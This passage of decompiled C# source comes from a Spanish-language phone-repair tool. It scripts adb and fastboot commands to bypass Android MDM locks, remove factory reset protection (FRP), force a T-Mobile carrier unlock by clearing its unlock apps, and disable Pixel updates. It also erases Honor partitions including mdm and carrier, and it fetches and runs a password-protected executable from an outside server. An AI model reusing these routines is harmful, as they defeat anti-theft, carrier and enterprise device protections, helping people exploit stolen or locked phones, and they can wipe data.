							etapaDisable.Add(string.Format("shell pm disable-user --user 0 {0}", pkg));
							etapaUninstall.Add(string.Format("shell pm uninstall --user 0 {0}", pkg));
						}
					}
					finally
					{
						IEnumerator<string> enumerator;
						if (enumerator != null)
						{
							enumerator.Dispose();
						}
					}
					CS$<>8__locals1.$VB$Local_etapas = new List<List<string>>
					{
						etapaClear,
						etapaDisable,
						etapaUninstall
					};
					this.UpdateProgressBar();
					await Task.Run(delegate()
					{
						CS$<>8__locals1.$VB$Me.EjecutarProcesoAdb(":", CS$<>8__locals1.$VB$Local_etapas, CS$<>8__locals1.$VB$Local_selectedDevice);
					});
					if (this.cmbDevicesAdb.SelectedItem != null)
					{
						string dispositivo = this.cmbDevicesAdb.SelectedItem.ToString();
						this.GuardarLog(dispositivo, "MDM All Patch 2025 Adb", this.txtOutput);
						string textoPlano = this.txtOutput.Text;
						this.GuardarLogEnFirebase(textoPlano);
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error durante el proceso: " + ex.Message);
			}
		}

		// Token: 0x06000133 RID: 307 RVA: 0x00010914 File Offset: 0x0000EB14
		private async void btnDisableUpdatePixel_Click(object sender, EventArgs e)
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				List<string> devices = await Task.Run<List<string>>(() => this.GetAdbDevices());
				if (devices.Count == 0 || this.cmbDevicesAdb.SelectedItem == null)
				{
					MessageBox.Show("No se ha detectado ningún dispositivo ADB. Por favor, conecta un dispositivo.");
				}
				else
				{
					this.processRunning = true;
					this.cancelRequested = false;
					this.SetAllButtonsEnabled(false, null);
					this.btnCancelarProceso.Enabled = true;
					this.txtOutput.Clear();
					this.VerificarEntornoSeguro();
					this.ListView1.Visible = false;
					try
					{
						Form1._Closure$__270-0 CS$<>8__locals1 = new Form1._Closure$__270-0(CS$<>8__locals1);
						CS$<>8__locals1.$VB$Me = this;
						this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							this.InitializeProgressBar(2);
							this.UpdateProgressBar();
						}));
						CS$<>8__locals1.$VB$Local_selectedDevice = this.cmbDevicesAdb.SelectedItem.ToString();
						Dictionary<string, string> paquetesDict = await Task.Run<Dictionary<string, string>>(() => this.ObtenerDiccionarioBloqueosPixel());
						this.UpdateProgressBar();
						this.MostrarEstadoAntesDelProceso("Desactivando Updates Pixel", paquetesDict, CS$<>8__locals1.$VB$Local_selectedDevice);
						List<string> etapaClear = new List<string>();
						List<string> etapaKill = new List<string>();
						List<string> etapaInactive = new List<string>();
						List<string> etapaSuspend = new List<string>();
						List<string> etapaDisable = new List<string>();
						List<string> etapaUninstall = new List<string>();
						List<string> etapaCrash = new List<string>();
						try
						{
							foreach (string pkg in paquetesDict.Values.Distinct<string>())
							{
								etapaClear.Add(string.Format("shell pm clear --user 0 {0}", pkg));
								etapaKill.Add(string.Format("shell am kill {0}", pkg));
								etapaInactive.Add(string.Format("shell am set-inactive {0}", pkg));
								etapaSuspend.Add(string.Format("shell pm suspend {0}", pkg));
								etapaDisable.Add(string.Format("shell pm disable-user --user 0 {0}", pkg));
								etapaUninstall.Add(string.Format("shell pm uninstall --user 0 {0}", pkg));
								etapaCrash.Add(string.Format("shell am crash {0}", pkg));
							}
						}
						finally
						{
							IEnumerator<string> enumerator;
							if (enumerator != null)
							{
								enumerator.Dispose();
							}
						}
						CS$<>8__locals1.$VB$Local_etapas = new List<List<string>>
						{
							etapaClear,
							etapaKill,
							etapaInactive,
							etapaSuspend,
							etapaDisable,
							etapaUninstall,
							etapaCrash
						};
						this.UpdateProgressBar();
						await Task.Run(delegate()
						{
							CS$<>8__locals1.$VB$Me.EjecutarProcesoAdb("Desactivando Updates Pixel", CS$<>8__locals1.$VB$Local_etapas, CS$<>8__locals1.$VB$Local_selectedDevice);
						});
						await this.EjecutarUnlockPixelRelockAsync(CS$<>8__locals1.$VB$Local_selectedDevice, this.txtOutput);
					}
					catch (Exception ex)
					{
						MessageBox.Show("Error durante el proceso: " + ex.Message);
					}
					finally
					{
						this.processRunning = false;
						this.btnCancelarProceso.Enabled = false;
						this.AplicarPermisosDesdeFirebasePorPlan();
					}
					this.UpdateProgressBar();
				}
			}
		}

		// Token: 0x06000134 RID: 308 RVA: 0x0001095C File Offset: 0x0000EB5C
		private void CancelarProceso(bool mostrarMensaje = true)
		{
			try
			{
				this.cancelRequested = true;
				this.processRunning = false;
				this.AplicarPermisosDesdeFirebasePorPlan();
				this.btnCancelarProceso.Enabled = false;
				ProcessStartInfo startInfo = new ProcessStartInfo("adb", "kill-server")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					RedirectStandardOutput = true,
					RedirectStandardError = true
				};
				using (Process process = Process.Start(startInfo))
				{
					process.WaitForExit(0);
				}
				if (mostrarMensaje)
				{
					MessageBox.Show("Proceso cancelado. Servidor ADB detenido.", "Cancelado", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error al cancelar el proceso: " + ex.Message);
			}
		}

		// Token: 0x06000135 RID: 309 RVA: 0x00010A3C File Offset: 0x0000EC3C
		private void btnCancelarProceso_Click(object sender, EventArgs e)
		{
			this.CancelarProceso(true);
		}

		// Token: 0x06000136 RID: 310 RVA: 0x00010A48 File Offset: 0x0000EC48
		private void LogOutput(string mensaje)
		{
			bool invokeRequired = this.txtOutput.InvokeRequired;
			if (invokeRequired)
			{
				this.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.txtOutput.AppendText(mensaje + Environment.NewLine);
				}));
			}
			else
			{
				this.txtOutput.AppendText(mensaje + Environment.NewLine);
			}
			try
			{
			}
			catch (Exception ex)
			{
				MessageBox.Show("❌ Error: " + ex.Message);
			}
			finally
			{
				this.processRunning = false;
				this.AplicarPermisosDesdeFirebasePorPlan();
				this.btnCancelarProceso.Enabled = false;
			}
		}

		// Token: 0x06000137 RID: 311 RVA: 0x00010B18 File Offset: 0x0000ED18
		private async Task EjecutarProcesoConControl(string nombreProceso, int timeoutMs, Func<Task> proceso, bool limpiarSalida = true, bool limpiarEstado = true)
		{
			object obj = this.processLock;
			ObjectFlowControl.CheckForSyncLockOnValueType(obj);
			lock (obj)
			{
				bool flag2 = this.processRunning;
				if (flag2)
				{
					this.LogOutput("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
					return;
				}
				this.processRunning = true;
			}
			this.cancelRequested = false;
			this.SetAllButtonsEnabled(false, this.btnCancelarProceso);
			this.btnCancelarProceso.Enabled = true;
			this.VerificarEntornoSeguro();
			if (limpiarSalida)
			{
				this.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.txtOutput.Clear();
				}));
			}
			this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
			{
				this.ProgressBar1.Minimum = 0;
				this.ProgressBar1.Value = 0;
				this.ProgressBar1.Maximum = 1;
			}));
			this.LogOutput(string.Format("▶ Iniciando proceso: {0}", nombreProceso));
			CancellationTokenSource cts = new CancellationTokenSource();
			CancellationToken token = cts.Token;
			Task tareaProceso = proceso();
			Task tareaTimeout = Task.Delay(timeoutMs);
			await Task.WhenAny(new Task[]
			{
				tareaProceso,
				tareaTimeout
			});
			if (!tareaProceso.IsCompleted)
			{
				this.cancelRequested = true;
				this.LogOutput(string.Format("⏰ Tiempo de espera agotado en '{0}'. El proceso fue cancelado automáticamente.", nombreProceso));
			}
			else
			{
				this.LogOutput(string.Format("✅ Proceso terminado: {0}", nombreProceso));
			}
			this.processRunning = false;
			this.btnCancelarProceso.Enabled = false;
			this.AplicarPermisosDesdeFirebasePorPlan();
		}

		// Token: 0x06000138 RID: 312 RVA: 0x00010B84 File Offset: 0x0000ED84
		private async void btnFRP_Click(object sender, EventArgs e)
		{
			this.btnFRP.Enabled = false;
			await this.RemoverFRPAsync();
			this.btnFRP.Enabled = true;
		}

		// Token: 0x06000139 RID: 313 RVA: 0x00010BCC File Offset: 0x0000EDCC
		private async void btnUnlockPixel_Click(object sender, EventArgs e)
		{
			this.ListView1.Visible = false;
			this.txtOutput.Clear();
			List<string> connectedDevices = this.GetAdbDevices();
			bool flag = this.cmbDevicesAdb.SelectedItem == null;
			if (flag)
			{
				MessageBox.Show("Selecciona un dispositivo ADB de la lista.");
			}
			else
			{
				string selectedDevice = this.cmbDevicesAdb.SelectedItem.ToString();
				bool flag2 = !connectedDevices.Contains(selectedDevice);
				if (flag2)
				{
					MessageBox.Show("El dispositivo seleccionado ya no está conectado.");
				}
				else
				{
					await this.EjecutarUnlockPixelAsync(selectedDevice, this.txtOutput);
				}
			}
		}

		// Token: 0x0600013A RID: 314 RVA: 0x00010C14 File Offset: 0x0000EE14
		private async void btnFlashSamsung_Click(object sender, EventArgs e)
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.processRunning = true;
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.ListView1.Visible = false;
				try
				{
					this.InitializeProgressBar(2);
					this.UpdateProgressBar();
					string basePath = "C:\\Users\\Public\\Libraries";
					string extractPath = Path.Combine(basePath, "FlashSamsung");
					string zipPath = Path.Combine(basePath, "FlashSamsung.7z");
					string flashExeName = "FlashSamsung.exe";
					string FlashSamsungExePath = Path.Combine(extractPath, flashExeName);
					string password = "Tstool@";
					bool flag2 = !Directory.Exists(basePath);
					if (flag2)
					{
						Directory.CreateDirectory(basePath);
					}
					this.txtOutput.AppendText("\ud83d\udd0d Verificando existencia de FlashSamsung..." + Environment.NewLine);
					bool flag3 = !File.Exists(FlashSamsungExePath);
					if (flag3)
					{
						this.txtOutput.AppendText("\ud83d\udd04 FlashSamsung no encontrado. Preparando recursos..." + Environment.NewLine);
						bool flag4 = !File.Exists(zipPath);
						if (flag4)
						{
							this.txtOutput.AppendText("\ud83d\udce5 Buscando recursos necesarios..." + Environment.NewLine);
							bool exito = await this.DownloadFileSimple("http://reparacionesdecelular.com/up/filesfix/FlashSamsung.7z", zipPath);
							if (!exito)
							{
								MessageBox.Show(string.Format("❌ Error al descargar archivo desde: {0}", zipPath));
								return;
							}
							this.txtOutput.AppendText("✅ Archivo descargado correctamente." + Environment.NewLine);
						}
						if (Directory.Exists(extractPath))
						{
							Directory.Delete(extractPath, true);
						}
						Directory.CreateDirectory(extractPath);
						if (Directory.Exists(extractPath))
						{
							Directory.Delete(extractPath, true);
						}
						Directory.CreateDirectory(extractPath);
						this.ExtractRomFileWith7Zip("FlashSamsung", password, extractPath);
						this.txtOutput.AppendText("✅ Extracción completada." + Environment.NewLine);
					}
					string[] posibles = Directory.GetFiles(extractPath, flashExeName, SearchOption.AllDirectories);
					if (posibles.Length == 0)
					{
						MessageBox.Show("❌ FlashSamsung no se extrajo correctamente.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					}
					else
					{
						FlashSamsungExePath = posibles[0];
						string iniPath = Path.Combine(Path.GetDirectoryName(FlashSamsungExePath), "Odin3.ini");
						if (!File.Exists(iniPath))
						{
							string contenidoIni = string.Concat(new string[]
							{
								"[Option]",
								Environment.NewLine,
								"Title=Flash",
								Environment.NewLine,
								"FactoryResetTime=1",
								Environment.NewLine,
								"OptionEnable=1",
								Environment.NewLine,
								"DeviceInfo=0",
								Environment.NewLine,
								"Warning=0",
								Environment.NewLine,
								Environment.NewLine,
								"[APOption]",
								Environment.NewLine,
								"RePartition=0",
								Environment.NewLine,
								"AutoReboot=1",
								Environment.NewLine,
								"FResetTime=1",
								Environment.NewLine,
								"FlashLock=0",
								Environment.NewLine,
								"TFlash=0",
								Environment.NewLine,
								"NandErase=0",
								Environment.NewLine,
								Environment.NewLine,
								"[CPOption]",
								Environment.NewLine,
								"PhoneEFSClear=0",
								Environment.NewLine,
								"PhoneBootUpdate=0k",
								Environment.NewLine,
								Environment.NewLine,
								"[UIOption]",
								Environment.NewLine,
								"LED=0",
								Environment.NewLine,
								Environment.NewLine,
								"[ButtonOption]",
								Environment.NewLine,
								"Bootloader=1",
								Environment.NewLine,
								"PDA=1",
								Environment.NewLine,
								"Phone=1",
								Environment.NewLine,
								"CSC=1",
								Environment.NewLine,
								"UMS/PATCH=1"
							});
							File.WriteAllText(iniPath, contenidoIni, Encoding.UTF8);
							this.txtOutput.AppendText("⚙️ Archivo Odin3.ini creado automáticamente." + Environment.NewLine);
						}
						string procName = Path.GetFileNameWithoutExtension(FlashSamsungExePath);
						Process[] running = Process.GetProcessesByName(procName);
						if (running.Length > 0)
						{
							this.txtOutput.AppendText("⚠️ FlashSamsung ya se está ejecutando. No se abrirá otra instancia." + Environment.NewLine);
						}
						else
						{
							ProcessStartInfo psi = new ProcessStartInfo
							{
								FileName = FlashSamsungExePath,
								WorkingDirectory = Path.GetDirectoryName(FlashSamsungExePath),
								UseShellExecute = true
							};
							Process.Start(psi);
							this.txtOutput.AppendText("\ud83d\ude80 FlashSamsung iniciado correctamente." + Environment.NewLine);
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show("❌ Error al iniciar FlashSamsung: " + ex.Message);
				}
				finally
				{
					this.processRunning = false;
					this.btnCancelarProceso.Enabled = false;
					this.AplicarPermisosDesdeFirebasePorPlan();
				}
			}
		}

		// Token: 0x0600013B RID: 315 RVA: 0x00010C5C File Offset: 0x0000EE5C
		private async Task<bool> EsVersionActualizada()
		{
			bool result;
			try
			{
				using (WebClient client = new WebClient())
				{
					string contenido = await client.DownloadStringTaskAsync("https://reparacionesdecelular.com/up/versionts.txt");
					string[] lineas = contenido.Split(new string[]
					{
						Environment.NewLine,
						"\n"
					}, StringSplitOptions.RemoveEmptyEntries);
					if (lineas.Length >= 2)
					{
						string versionRemota = lineas[0].Trim();
						string urlDescarga = lineas[1].Trim();
						if (Operators.CompareString(versionRemota, "0.1.15", false) != 0)
						{
							MessageBox.Show(string.Format("\ud83d\udd04 Tu versión ({0}) está desactualizada. La versión más reciente es {1}.{2}Se abrirá la página de descarga.", "0.1.15", versionRemota, Environment.NewLine), "Actualización requerida", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
							Application.Exit();
							result = false;
						}
						else
						{
							result = true;
						}
					}
					else
					{
						MessageBox.Show("⚠️ El archivo de versión no tiene el formato correcto.", "Error de versión", MessageBoxButtons.OK, MessageBoxIcon.Hand);
						Application.Exit();
						result = false;
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show("❌ No se pudo comprobar la versión. Verifica tu conexión a internet.", "Error de conexión", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				Application.Exit();
				result = false;
			}
			return result;
		}

		// Token: 0x0600013C RID: 316 RVA: 0x00010CA0 File Offset: 0x0000EEA0
		private async void btnUnlockTMobile_Click(object sender, EventArgs e)
		{
			await this.EjecutarProcesoTMobileUnlock(this.txtOutput);
		}

		// Token: 0x0600013D RID: 317 RVA: 0x00010CE8 File Offset: 0x0000EEE8
		private async Task EjecutarProcesoTMobileUnlock(RichTextBox richTextBoxLog)
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.processRunning = true;
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.ListView1.Visible = false;
				richTextBoxLog.Clear();
				try
				{
					object selectedItem = this.cmbDevicesAdb.SelectedItem;
					string selectedDevice = (selectedItem != null) ? selectedItem.ToString() : null;
					bool flag2 = string.IsNullOrEmpty(selectedDevice);
					if (flag2)
					{
						MessageBox.Show("No hay dispositivo seleccionado.");
					}
					else
					{
						List<string> comandos = new List<string>
						{
							"shell input keyevent KEYCODE_WAKEUP",
							"shell input keyevent 82",
							"shell am start -n com.tmobile.rsuapp/com.tmobile.rsuapp.MainActivity"
						};
						try
						{
							foreach (string cmd in comandos)
							{
								string output = this.ExecuteAdbCommand(cmd, selectedDevice);
								richTextBoxLog.AppendText(string.Format("Step 1 → {0}{1}", output, Environment.NewLine));
								await Task.Delay(500);
							}
						}
						finally
						{
							List<string>.Enumerator enumerator;
							((IDisposable)enumerator).Dispose();
						}
						await Task.Delay(10000);
						richTextBoxLog.AppendText("Check Network 1..." + Environment.NewLine);
						string wifiOff = this.ExecuteAdbCommand("shell svc wifi disable", selectedDevice);
						richTextBoxLog.AppendText(wifiOff + Environment.NewLine);
						List<string> etapa2 = new List<string>
						{
							"shell pm clear --user 0 com.tmobile.rsuapp",
							"shell pm clear --user 0 com.tmobile.rsusrv",
							"shell am start -n com.tmobile.rsuapp/com.tmobile.rsuapp.MainActivity"
						};
						try
						{
							foreach (string cmd2 in etapa2)
							{
								string output2 = this.ExecuteAdbCommand(cmd2, selectedDevice);
								richTextBoxLog.AppendText(string.Format("Step 2 → {0}{1}", output2, Environment.NewLine));
								await Task.Delay(500);
							}
						}
						finally
						{
							List<string>.Enumerator enumerator2;
							((IDisposable)enumerator2).Dispose();
						}
						richTextBoxLog.AppendText("Check Network 2..." + Environment.NewLine);
						string wifiOn = this.ExecuteAdbCommand("shell svc wifi enable", selectedDevice);
						richTextBoxLog.AppendText(wifiOn + Environment.NewLine);
						await Task.Delay(5000);
						richTextBoxLog.AppendText("Check Network 3..." + Environment.NewLine);
						List<string> etapa3 = new List<string>
						{
							"shell input keyevent KEYCODE_WAKEUP",
							"shell input keyevent 82",
							"shell pm clear --user 0 com.tmobile.rsuapp",
							"shell pm clear --user 0 com.tmobile.rsusrv",
							"shell am start -n com.tmobile.rsuapp/com.tmobile.rsuapp.MainActivity"
						};
						try
						{
							foreach (string cmd3 in etapa3)
							{
								string output3 = this.ExecuteAdbCommand(cmd3, selectedDevice);
								richTextBoxLog.AppendText(string.Format("Step 3 → {0}{1}", output3, Environment.NewLine));
								await Task.Delay(900);
							}
						}
						finally
						{
							List<string>.Enumerator enumerator3;
							((IDisposable)enumerator3).Dispose();
						}
						List<string> etapa4 = new List<string>
						{
							"shell am start -n com.tmobile.rsuapp/com.tmobile.rsuapp.MainActivity"
						};
						try
						{
							foreach (string cmd4 in etapa4)
							{
								string output4 = this.ExecuteAdbCommand(cmd4, selectedDevice);
								richTextBoxLog.AppendText(string.Format("Step 2 → {0}{1}", output4, Environment.NewLine));
								await Task.Delay(500);
							}
						}
						finally
						{
							List<string>.Enumerator enumerator4;
							((IDisposable)enumerator4).Dispose();
						}
						richTextBoxLog.AppendText("✅ Proceso T-Mobile Device Unlock finalizado." + Environment.NewLine);
					}
				}
				catch (Exception ex)
				{
					richTextBoxLog.AppendText("❌ Error: " + ex.Message + Environment.NewLine);
				}
				finally
				{
					this.processRunning = false;
					this.btnCancelarProceso.Enabled = false;
					this.AplicarPermisosDesdeFirebasePorPlan();
				}
			}
		}

		// Token: 0x0600013E RID: 318 RVA: 0x00010D34 File Offset: 0x0000EF34
		private void btnOpenFileHxd_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog
			{
				Filter = "Archivos binarios (*.bin)|*.bin|Todos los archivos (*.*)|*.*",
				Title = "Seleccionar archivo para editar"
			};
			bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				this.currentFilePath = openFileDialog.FileName;
				byte[] data = File.ReadAllBytes(this.currentFilePath);
				this.DisplayHexData(data);
			}
		}

		// Token: 0x0600013F RID: 319 RVA: 0x00010D90 File Offset: 0x0000EF90
		private void DisplayHexData(byte[] data)
		{
			StringBuilder stringBuilder = new StringBuilder();
			checked
			{
				int num = data.Length - 1;
				for (int i = 0; i <= num; i += 16)
				{
					stringBuilder.Append(i.ToString("X8") + ": ");
					StringBuilder stringBuilder2 = new StringBuilder();
					int num2 = 0;
					do
					{
						bool flag = i + num2 < data.Length;
						if (flag)
						{
							byte b = data[i + num2];
							stringBuilder.Append(b.ToString("X2") + " ");
							stringBuilder2.Append((b >= 32 && b <= 126) ? Strings.ChrW((int)b) : '.');
						}
						else
						{
							stringBuilder.Append("   ");
							stringBuilder2.Append(" ");
						}
						num2++;
					}
					while (num2 <= 15);
					stringBuilder.Append(" | ");
					stringBuilder.Append(stringBuilder2.ToString());
					stringBuilder.AppendLine();
				}
				this.txtOutput.Text = stringBuilder.ToString();
			}
		}

		// Token: 0x06000140 RID: 320 RVA: 0x00010E90 File Offset: 0x0000F090
		private async void btnWipeFastbootHonor_Click(object sender, EventArgs e)
		{
			await this.EjecutarProcesoWipeFastbootHonor();
		}

		// Token: 0x06000141 RID: 321 RVA: 0x00010ED8 File Offset: 0x0000F0D8
		public async Task EjecutarEtapasFastbootExtendido(string nombreProceso, List<List<string>> etapas, RichTextBox richTextBoxLog, bool mostrarMensajeFinal = true, bool guardarLog = true, string rutaLogPersonalizada = "")
		{
			Form1._Closure$__285-1 CS$<>8__locals1 = new Form1._Closure$__285-1(CS$<>8__locals1);
			CS$<>8__locals1.$VB$Me = this;
			CS$<>8__locals1.$VB$Local_etapas = etapas;
			CS$<>8__locals1.$VB$Local_richTextBoxLog = richTextBoxLog;
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.processRunning = true;
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				bool flag2 = CS$<>8__locals1.$VB$Local_richTextBoxLog != null;
				if (flag2)
				{
					CS$<>8__locals1.$VB$Local_richTextBoxLog.Clear();
				}
				this.VerificarEntornoSeguro();
				CS$<>8__locals1.$VB$Local_logGlobal = new StringBuilder();
				Stopwatch cronometro = new Stopwatch();
				try
				{
					Form1._Closure$__285-0 CS$<>8__locals2 = new Form1._Closure$__285-0(CS$<>8__locals2);
					CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2 = CS$<>8__locals1;
					List<string> devices = await Task.Run<List<string>>(() => this.GetFastbootDevices());
					goto IL_42D;
					TaskAwaiter taskAwaiter2;
					TaskAwaiter taskAwaiter = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
					taskAwaiter.GetResult();
					taskAwaiter = default(TaskAwaiter);
					cronometro.Stop();
					TimeSpan duracion = cronometro.Elapsed;
					string resumen = string.Format("⏱ Duración total del proceso: {0}m {1}s", duracion.Minutes, duracion.Seconds);
					CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_logGlobal.AppendLine(resumen);
					if (!mostrarMensajeFinal)
					{
						goto IL_2FE;
					}
					if (CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_richTextBoxLog == null)
					{
						goto IL_2FC;
					}
					CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_richTextBoxLog.AppendText(string.Format("✅ Proceso '{0}' completado.", nombreProceso) + Environment.NewLine);
					CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_richTextBoxLog.AppendText(resumen + Environment.NewLine);
					IL_2FC:
					IL_2FE:;
				}
				catch (Exception ex)
				{
					MessageBox.Show(string.Format("❌ Error durante el proceso '{0}': {1}", nombreProceso, ex.Message));
				}
				finally
				{
					this.processRunning = false;
					this.btnCancelarProceso.Enabled = false;
					this.AplicarPermisosDesdeFirebasePorPlan();
					if (guardarLog)
					{
						try
						{
							string rutaFinal = (!string.IsNullOrEmpty(rutaLogPersonalizada)) ? rutaLogPersonalizada : Path.Combine(Application.StartupPath, "Logs", string.Format("{0}_{1:yyyyMMdd_HHmmss}.txt", nombreProceso, DateAndTime.Now));
							Directory.CreateDirectory(Path.GetDirectoryName(rutaFinal));
							File.WriteAllText(rutaFinal, CS$<>8__locals1.$VB$Local_logGlobal.ToString());
						}
						catch (Exception logEx)
						{
							MessageBox.Show("No se pudo guardar el log: " + logEx.Message);
						}
					}
				}
				IL_42D:
				this.UpdateProgressBar();
			}
		}

		// Token: 0x06000142 RID: 322 RVA: 0x00010F4C File Offset: 0x0000F14C
		private async Task EjecutarProcesoWipeFastbootHonor()
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.txtOutput.Clear();
				this.cmbDevices.Items.Clear();
				List<string> devices = await Task.Run<List<string>>(() => this.GetFastbootDevices());
				if (devices.Count > 0)
				{
					try
					{
						foreach (string device in devices)
						{
							this.cmbDevices.Items.Add(device);
						}
					}
					finally
					{
						List<string>.Enumerator enumerator;
						((IDisposable)enumerator).Dispose();
					}
					this.cmbDevices.SelectedIndex = 0;
					this.fastbootTimer.Enabled = false;
					List<string> comandos = new List<string>
					{
						"-w",
						"erase userdata",
						"erase metadata",
						"erase cache",
						"erase mdm",
						"erase carrier",
						"erase ddr",
						"erase misc",
						"reboot"
					};
					await this.EjecutarComandosFastboot(comandos);
					this.txtOutput.AppendText("✅ Proceso de borrado completado." + Environment.NewLine);
					this.processRunning = false;
					this.btnCancelarProceso.Enabled = false;
					this.AplicarPermisosDesdeFirebasePorPlan();
				}
				else
				{
					this.cmbDevices.Items.Add("Waiting for devices...");
					this.cmbDevices.SelectedIndex = 0;
					this.txtOutput.AppendText("No Fastboot devices found." + Environment.NewLine);
					this.AplicarPermisosDesdeFirebasePorPlan();
				}
			}
		}

		// Token: 0x06000143 RID: 323 RVA: 0x00010F90 File Offset: 0x0000F190
		private string ExecuteFastbootCommand(string command, string deviceId)
		{
			string result;
			try
			{
				ProcessStartInfo startInfo = new ProcessStartInfo
				{
					FileName = "fastboot.exe",
					Arguments = string.Format("-s {0} {1}", deviceId, command),
					RedirectStandardOutput = true,
					UseShellExecute = false,
					CreateNoWindow = true
				};
				using (Process process = Process.Start(startInfo))
				{
					result = process.StandardOutput.ReadToEnd();
				}
			}
			catch (Exception ex)
			{
				result = "❌ Error ejecutando fastboot: " + ex.Message;
			}
			return result;
		}

		// Token: 0x06000144 RID: 324 RVA: 0x00011040 File Offset: 0x0000F240
		private async void btnXiaomiBypassv1_Click(object sender, EventArgs e)
		{
			Form1._Closure$__288-0 CS$<>8__locals1 = new Form1._Closure$__288-0(CS$<>8__locals1);
			CS$<>8__locals1.$VB$Me = this;
			CS$<>8__locals1.$VB$Local_devices = this.GetAdbDevices();
			bool flag = CS$<>8__locals1.$VB$Local_devices.Count == 0;
			if (flag)
			{
				MessageBox.Show("No se detectó ningún dispositivo ADB.");
			}
			else
			{
				this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					CS$<>8__locals1.$VB$Me.cmbDevicesAdb.Items.Clear();
					try
					{
						foreach (string item in CS$<>8__locals1.$VB$Local_devices)
						{
							CS$<>8__locals1.$VB$Me.cmbDevicesAdb.Items.Add(item);
						}
					}
					finally
					{
						List<string>.Enumerator enumerator;
						((IDisposable)enumerator).Dispose();
					}
					CS$<>8__locals1.$VB$Me.cmbDevicesAdb.SelectedIndex = 0;
				}));
				CS$<>8__locals1.$VB$Local_selectedDevice = "";
				this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					CS$<>8__locals1.$VB$Local_selectedDevice = CS$<>8__locals1.$VB$Me.cmbDevicesAdb.SelectedItem.ToString();
				}));
				await this.EjecutarXiaomiRedmiMdmV1(CS$<>8__locals1.$VB$Local_selectedDevice);
			}
		}

		// Token: 0x06000145 RID: 325 RVA: 0x00011088 File Offset: 0x0000F288
		private async void btnHonorfullv1_Click(object sender, EventArgs e)
		{
			Form1._Closure$__289-0 CS$<>8__locals1 = new Form1._Closure$__289-0(CS$<>8__locals1);
			CS$<>8__locals1.$VB$Me = this;
			CS$<>8__locals1.$VB$Local_devices = this.GetAdbDevices();
			bool flag = CS$<>8__locals1.$VB$Local_devices.Count == 0;
			if (flag)
			{
				MessageBox.Show("No se detectó ningún dispositivo ADB.");
			}
			else
			{
				this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					CS$<>8__locals1.$VB$Me.cmbDevicesAdb.Items.Clear();
					try
					{
						foreach (string item in CS$<>8__locals1.$VB$Local_devices)
						{
							CS$<>8__locals1.$VB$Me.cmbDevicesAdb.Items.Add(item);
						}
					}
					finally
					{
						List<string>.Enumerator enumerator;
						((IDisposable)enumerator).Dispose();
					}
					CS$<>8__locals1.$VB$Me.cmbDevicesAdb.SelectedIndex = 0;
				}));
				CS$<>8__locals1.$VB$Local_selectedDevice = "";
				this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					CS$<>8__locals1.$VB$Local_selectedDevice = CS$<>8__locals1.$VB$Me.cmbDevicesAdb.SelectedItem.ToString();
				}));
				string manufacturer = this.ExecuteAdbCommand("shell getprop ro.product.manufacturer", CS$<>8__locals1.$VB$Local_selectedDevice).ToLower().Trim();
				bool flag2 = Operators.CompareString(manufacturer, "honor", false) != 0;
				if (flag2)
				{
					MessageBox.Show(string.Format("Este proceso sólo es compatible con dispositivos Honor. Dispositivo detectado: {0}", manufacturer));
				}
				else
				{
					await this.mdm_honorfullv1(CS$<>8__locals1.$VB$Local_selectedDevice);
				}
			}
		}

		// Token: 0x06000146 RID: 326 RVA: 0x000110D0 File Offset: 0x0000F2D0
		private async Task EjecutarXiaomiRedmiMdmV1(string selectedDevice)
		{
			bool flag = this.processRunning;
			if (!flag)
			{
				this.processRunning = true;
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
